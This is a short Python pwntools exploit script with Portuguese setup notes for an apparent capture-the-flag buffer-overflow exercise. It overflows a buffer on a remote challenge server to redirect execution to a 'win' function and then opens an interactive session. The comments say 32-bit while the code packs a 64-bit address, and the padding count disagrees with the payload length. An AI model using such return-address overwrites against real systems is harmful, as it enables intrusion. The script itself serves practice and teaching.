# Instalar o pip e as pwntools: pip3 install --user pwntools
#
# Ao obter o erro de execução do binário: No such file or directory, instalar as libs 32 bits, visto que o binário é 32 bits (x86):
# sudo dpkg --add-architecture i386
# sudo apt update -y
# sudo apt install -y libc6:i386 libncurses5:i386 libstdc++6:i386
#
# Usar o codigo seguinte:

from pwn import *
import binascii

local = False

if local:
	r = process("./pwnable")
else:
	r = remote("159.89.31.211",5000)

s = r.recvuntil("Please overflow my buffer:\n")
print(s)

# Mudar 0 para o numero correcto de A's de forma a reescrever o return address
# com o address da funcao win
n = 23

# p32() -> converte para string um endereco de tamanho 4 bytes
# Equivalente a struct.pack("<I", 0xdeadbeef)
# Se o executavel fosse 64 bits devia ser usada a funcao p64()
# Alterar para o endereco correcto da funcao win 0x80...
# gdb => disass win e sacar o primeiro endereço de memoria
win_function = p64(0x400676)

#win_function = '\xbe\x01\x02\x00\x00\x00\x00\x00'
#win_function = 'v\x06@\x00\x00\x00\x00\x00'

#payload = b"A"*n + win_function 


payload = "AAAAAAAAAAAAAAAAAAAAAAAA"+win_function
r.sendline(payload)

r.interactive()

#AAAAAAAAAAAAAAAAAAAAAAAA'v\x06@\x00\x00\x00\x00\x00'